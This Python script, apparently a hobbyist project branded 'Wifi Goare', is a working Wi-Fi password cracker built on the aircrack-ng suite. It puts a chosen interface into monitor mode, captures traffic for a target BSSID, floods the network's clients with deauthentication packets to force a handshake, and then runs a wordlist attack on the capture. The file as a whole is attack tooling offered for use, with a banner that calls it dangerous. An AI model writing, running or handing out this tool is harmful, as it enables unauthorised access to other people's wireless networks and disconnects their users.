import shutil
import subprocess
import time
import os
import signal
import sys
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# Global variable to store the process ID of a running task
process_pid = None

# Banner ASCII Art
banner = '''
██     ██ ██ ███████ ██       ██████       ██████   ██████   █████  ██████  ███████ 
██     ██ ██ ██      ██      ██    ██     ██       ██    ██ ██   ██ ██   ██ ██      
██  █  ██ ██ █████   ██      ██    ██     ██   ███ ██    ██ ███████ ██████  █████   
██ ███ ██ ██ ██      ██      ██    ██     ██    ██ ██    ██ ██   ██ ██   ██ ██      
 ███ ███  ██ ██      ███████  ██████       ██████   ██████  ██   ██ ██   ██ ███████ 
                                                                                    
====================================================================================
🔥  DANGEROUS TOOL FOR WIFI PASSWORD CRACKING | USE AT YOUR OWN RISK! 🔥
====================================================================================
🚀 Developer: Ankit Kumar | Powered by Python & Aircrack-ng 🚀
====================================================================================
'''

# Developer's Name Section
developer_name = Fore.CYAN + Style.BRIGHT + "Developer: Ankit Kumar\n"

# Function to print the banner with an intense typing effect
def print_banner():
    print(Fore.RED + Style.BRIGHT + banner)  # Display ASCII Art
    print(Fore.MAGENTA + Style.BRIGHT + developer_name)  # Display developer's name
    print(Fore.YELLOW + """
    ***************************************************
    *             WARNING: DANGEROUS TOOL AHEAD      *
    *        ===============================        *
    *          Powered by Python & Aircrack-ng       *
    ***************************************************
    """)

# Function to handle keyboard interrupt gracefully
def signal_handler(sig, frame):
    """Handle keyboard interrupts gracefully"""
    global process_pid
    if process_pid:
        print(Fore.RED + f"\n[!] Terminating process {process_pid}...")
        os.kill(process_pid, signal.SIGTERM)
    sys.exit(0)

# Set up the signal handler to terminate running processes on exit
signal.signal(signal.SIGINT, signal_handler)

def enable_monitor_mode(interface):
    """Enable monitor mode on the given network interface"""
    print(Fore.YELLOW + f"[*] Enabling monitor mode on {interface}...")
    try:
        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Error enabling monitor mode: {e}")
        sys.exit(1)

def disable_monitor_mode(interface):
    """Disable monitor mode on the given network interface"""
    print(Fore.YELLOW + f"[*] Disabling monitor mode on {interface}...")
    try:
        subprocess.run(["sudo", "airmon-ng", "stop", interface], check=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Error disabling monitor mode: {e}")
        sys.exit(1)

def capture_packets(interface, bssid, channel):
    """Capture packets using airodump-ng"""
    print(Fore.GREEN + f"[*] Capturing packets on channel {channel}...")
    capture_file = f"capture_{bssid.replace(':', '')}"
    try:
        global process_pid
        process = subprocess.Popen(["sudo", "airodump-ng", "--bssid", bssid, "--channel", str(channel), "--write", capture_file, interface])
        process_pid = process.pid  # Store process ID to kill later
        process.communicate()  # Wait for the process to complete
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Error capturing packets: {e}")
        sys.exit(1)

def deauthenticate_clients(interface, bssid):
    """Send deauthentication packets to disconnect clients"""
    print(Fore.RED + "[*] Deauthenticating clients...")
    try:
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, interface], check=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Error deauthenticating clients: {e}")
        sys.exit(1)

def crack_password(capture_file, bssid, wordlist):
    """Crack the password using aircrack-ng"""
    print(Fore.CYAN + "[*] Cracking password with the wordlist...")
    try:
        subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, "-b", bssid, capture_file + "-01.cap"], check=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Error cracking password: {e}")
        sys.exit(1)

def check_dependencies():
    """Ensure required dependencies are installed"""
    print(Fore.YELLOW + "[*] Checking for dependencies...")
    required_tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
    for tool in required_tools:
        if not shutil.which(tool):
            print(Fore.RED + f"[!] {tool} is not installed. Please install it before proceeding.")
            sys.exit(1)
    print(Fore.GREEN + "[*] All dependencies are installed.")

def main():
    """Main function to run the Wi-Fi password cracking tool"""
    print_banner()  # Print banner and developer's name
    
    check_dependencies()
    
    interface = input(Fore.CYAN + "Enter the network interface (e.g., wlan0): ")
    bssid = input(Fore.CYAN + "Enter the BSSID of the target network: ")
    wordlist = input(Fore.CYAN + "Enter path to wordlist: ")
    channel = input(Fore.CYAN + "Enter the channel of the target network (e.g., 6): ")

    enable_monitor_mode(interface)
    capture_packets(interface, bssid, channel)
    deauthenticate_clients(interface, bssid)
    capture_packets(interface, bssid, channel)
    crack_password(f"capture_{bssid.replace(':', '')}", bssid, wordlist)
    disable_monitor_mode(interface)

if __name__ == "__main__":
    main()
